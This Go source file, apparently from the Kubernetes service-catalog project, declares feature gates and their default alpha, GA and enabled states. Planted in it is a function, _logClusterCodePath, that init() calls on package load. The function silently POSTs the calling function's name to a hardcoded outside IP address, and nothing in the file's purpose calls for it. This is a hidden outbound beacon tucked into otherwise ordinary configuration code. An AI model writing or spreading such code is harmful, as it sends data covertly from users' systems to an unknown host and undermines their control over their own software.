package features

import (
	utilfeature "k8s.io/apiserver/pkg/util/feature"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

const (
	OriginatingIdentity			utilfeature.Feature	= "OriginatingIdentity"
	AsyncBindingOperations		utilfeature.Feature	= "AsyncBindingOperations"
	PodPreset					utilfeature.Feature	= "PodPreset"
	NamespacedServiceBroker		utilfeature.Feature	= "NamespacedServiceBroker"
	ResponseSchema				utilfeature.Feature	= "ResponseSchema"
	UpdateDashboardURL			utilfeature.Feature	= "UpdateDashboardURL"
	OriginatingIdentityLocking	utilfeature.Feature	= "OriginatingIdentityLocking"
	ServicePlanDefaults			utilfeature.Feature	= "ServicePlanDefaults"
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	utilfeature.DefaultFeatureGate.Add(defaultServiceCatalogFeatureGates)
}

var defaultServiceCatalogFeatureGates = map[utilfeature.Feature]utilfeature.FeatureSpec{PodPreset: {Default: false, PreRelease: utilfeature.Alpha}, OriginatingIdentity: {Default: true, PreRelease: utilfeature.GA}, AsyncBindingOperations: {Default: false, PreRelease: utilfeature.Alpha}, NamespacedServiceBroker: {Default: true, PreRelease: utilfeature.Alpha}, ResponseSchema: {Default: false, PreRelease: utilfeature.Alpha}, UpdateDashboardURL: {Default: false, PreRelease: utilfeature.Alpha}, OriginatingIdentityLocking: {Default: true, PreRelease: utilfeature.Alpha}, ServicePlanDefaults: {Default: false, PreRelease: utilfeature.Alpha}}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
